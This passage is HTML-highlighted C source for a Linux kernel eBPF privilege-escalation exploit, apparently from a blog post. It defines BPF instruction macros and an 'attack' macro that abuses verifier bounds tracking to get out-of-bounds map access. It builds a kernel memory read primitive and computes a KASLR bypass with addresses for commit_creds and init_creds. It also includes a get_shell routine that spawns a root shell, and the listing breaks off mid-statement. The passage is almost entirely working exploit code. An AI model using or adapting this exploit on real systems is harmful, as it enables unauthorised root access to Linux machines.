\</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> log_level, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = log_level,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dzhsb\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    <span class="keyword">if</span> (log_level == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// char *each_line_log = strtok(verifier_log_buff, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">// each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// while (each_line_log)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     int len = strlen(each_line_log);</span></span><br><span class="line">        <span class="comment">//     if (len &gt; 231)</span></span><br><span class="line">        <span class="comment">//     &#123;</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, (each_line_log + 231));</span></span><br><span class="line">        <span class="comment">//         each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">//         continue;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//     each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        close(prog_fd);</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd, map_fd2)                                              \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_2, BPF_REG_0, 0),                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, map_fd2),                                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_4),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000),                           \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> map_fd2, <span class="keyword">uint64_t</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0xD0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">8</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> map_fd2 = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span> || map_fd2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd2);</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">ops</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(ops, <span class="keyword">sizeof</span>(ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">2</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd2, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> array_map_ops = *(<span class="keyword">uint64_t</span> *)values;</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, 